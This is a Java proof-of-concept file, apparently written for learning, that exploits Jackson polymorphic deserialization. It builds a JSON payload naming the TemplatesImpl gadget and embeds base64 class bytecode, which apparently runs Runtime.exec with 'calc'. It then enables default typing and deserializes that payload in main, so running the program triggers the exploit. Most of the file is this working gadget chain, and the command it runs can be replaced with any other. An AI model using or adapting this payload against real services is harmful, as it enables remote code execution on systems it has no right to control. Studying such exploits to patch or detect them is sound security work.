package com.dem0.learn;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.h2.util.IOUtils;

import java.io.*;

public class Hello {
    static class Bean1599 {
        public int id;
        public Object obj;
    }
    public static String readClass(String filename) throws Exception {
//        FileUtils.writeByteArrayToFile(classFilePath, bytes);  将一个二进制写到文件之中
        byte[] buf = null;
        File file = new File(filename);
        FileInputStream fis = null;
        try {
            fis = new FileInputStream(file);
            int size = fis.available();
            byte[] bytes = new byte[size];
            fis.read(bytes);
            return new String(bytes);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new String(buf);
    }
//    /**
//     *加载指定路径的类字节码，并base64编码成byte[]
//     * @param cls
//     * @return
//     */
//    public static String readClass(String cls){
//        ByteArrayOutputStream bos = new ByteArrayOutputStream();
//        try {
//            IOUtils.copy(new FileInputStream(new File(cls)), bos);
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//        return Base64.encodeBase64String(bos.toByteArray());
//    }
    public static String aposToQuotes(String json) {
        return json.replace("'", "\"");
    }
    public static String genpayload() throws Exception {
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String evilCode = new String("yv66vgAAADQAMAoACwAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEIACIHACMHACQBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACEBAApTb3VyY2VGaWxlAQAMVGVzdGFiYy5qYXZhDAAMAA0HACUMACYAJwEABUhlbGxwBwAoDAApACoHACsMACwALQEABGNhbGMMAC4ALwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAExAQAHVGVzdGFiYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACgALAAAAAAADAAEADAANAAEADgAAAB0AAQABAAAABSq3AAGxAAAAAQAPAAAABgABAAAAAQAJABAAEQABAA4AAAAlAAIAAQAAAAmyAAISA7YABLEAAAABAA8AAAAKAAIAAAAKAAgACwAIABIADQABAA4AAABTAAIAAQAAABa4AAUSBrYAB1enAAxLsgACEgm2AASxAAEAAAAJAAwACAACAA8AAAAWAAUAAAAEAAkABwAMAAUADQAGABUACAATAAAABwACTAcAFAgAAQAVAAAAAgAW");
        final String JSON = aposToQuotes("{"
                        + " 'obj':[ '" + NASTY_CLASS + "',\n"
                        + "  {\n"
                        + "    'transletBytecodes' : [ '" + evilCode + "' ],\n"
                        + "    'transletName' : 'a.b',\n"
                        + "    'outputProperties' : { }\n"
                        + "  }\n"
                        + " ]\n"
                        + "}");
        return  JSON;
    }
    public static void main(String[] args) throws Exception {
        String json = genpayload();
        System.out.println(json);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.readValue(json,Bean1599.class);
//            Student stu = new Student();
//            stu.name="dem0";
//            stu.age = 100;
//            ObjectMapper mapper = new ObjectMapper();
//            //序列化
//            String json = mapper.writeValueAsString(stu);
//            System.out.println(json);
//            //{"age":100,"name":"dem0"}
//            //反序列化
//            Student stu1 = mapper.readValue(json,Student.class);
//            System.out.println(stu1);
            //age=100, name=dem0
    }
}

class Student{
    public int age;
    public String name;

    @Override
    public String toString() {
        return String.format("age=%d, name=%s", age, name);
    }
}